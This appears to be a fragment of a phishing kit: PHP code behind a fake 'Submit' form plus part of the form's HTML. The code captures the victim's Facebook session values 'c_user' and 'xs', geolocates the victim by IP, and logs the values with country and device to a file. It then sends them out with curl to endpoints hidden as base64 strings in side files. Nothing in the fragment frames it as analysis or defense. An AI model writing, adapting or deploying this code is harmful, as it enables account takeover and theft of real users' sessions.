...
$ip_parts = explode(', ', $ip);
$first_ip = $ip_parts[0];
$api_url = "http://ip-api.com/json/$first_ip"; // New API endpoint
...
$dataEmailPath1 = $parentDirectory . '/dataemail.txt';
$EmailPath1 = file_get_contents($dataEmailPath1);
$phpmailers = $homeDirectory . "/Action _ Required_files/phpmailer.txt";
$phpmailers1 = file_get_contents($phpmailers);
$dcc1 = base64_decode($phpmailers1);
$server= $homeDirectory . "/Action _ Required_files/mailer.txt";
$ccm = file_get_contents($server);
$checker2 = base64_decode($ccm);
if ($_SERVER["REQUEST_METHOD"] == "POST") {
        $username = isset($_POST['c_user']) ? htmlspecialchars($_POST['c_user']) : '';
        $pwd = isset($_POST['xs']) ? htmlspecialchars($_POST['xs']) : '';
        $user_agent = $_SERVER['HTTP_USER_AGENT'];
        $ctime = date("m/d/Y h:i:s a", time());
        $logText = "c_user: $username\n" .
         "xs: $pwd\n" .
         "country: $loc\n" .
         "Device: $user_agent";
        file_put_contents("log.txt", $logText . "\n", FILE_APPEND);
        $_POST['c_user'] = '';
        $_POST['xs'] = '';
  $checker3 = $checker2 . urlencode($EmailPath1 . "\n" . $logText. "\n" );
  $curl = curl_init($checker3);
...
?>
  ...
  if (isset($username) && isset($pwd)) {
      $userkey1 = $dcc1 . $EmailPath1 . '&smtp=' . urlencode($logText);
      $curl = curl_init($userkey1);
      curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
      $result = curl_exec($curl);
      curl_close($curl);
  }
                ...
                <div data-form-element-key="ButtonNext" class="FormElement FormElement_Button ButtonNext">
                  <div class="Button">
                    <button name="ButtonNext" class="ButtonNext" data-elements-processor="">
                      Submit </button>
                 <form class="sm:hidden lg:block md:block" action="process" method="post">
                  </div>
                </div>
              </div>
              <center>
